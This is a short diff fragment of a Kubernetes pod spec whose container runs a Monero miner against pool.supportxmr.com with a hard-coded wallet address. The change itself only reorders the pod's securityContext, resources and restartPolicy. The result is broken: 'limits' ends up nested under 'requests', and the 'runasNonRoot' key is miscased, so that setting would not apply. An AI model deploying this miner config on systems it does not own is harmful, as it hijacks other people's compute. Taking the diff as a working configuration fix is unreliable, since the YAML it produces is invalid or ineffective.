@@ -37,13 +37,13 @@ spec:
             - "pool.supportxmr.com:443"
             - "-u"
             - "4ADPTNcDyiu9cnpud2Fksr6c6Nfsg32hu6J6FUHTsavaTRc6Rz5WbXGEPaTsBsxN4gcpaMVXyRr2nEnuGjQ61XY9NdpFQDt"
-          restartPolicy: Always
-        securityContext:
-          allowPrivilegeEscalation: false
-          runasNonRoot: true
-        resources:
-          requests:
-            memory: "256Mi"
-            cpu: "250m"
-          limits:
-            memory: "1Gi"
+          securityContext:
+            allowPrivilegeEscalation: false
+            runasNonRoot: true
+          resources:
+            requests:
+              memory: "256Mi"
+              cpu: "250m"
+              limits:
+                memory: "1Gi"
+        restartPolicy: Always
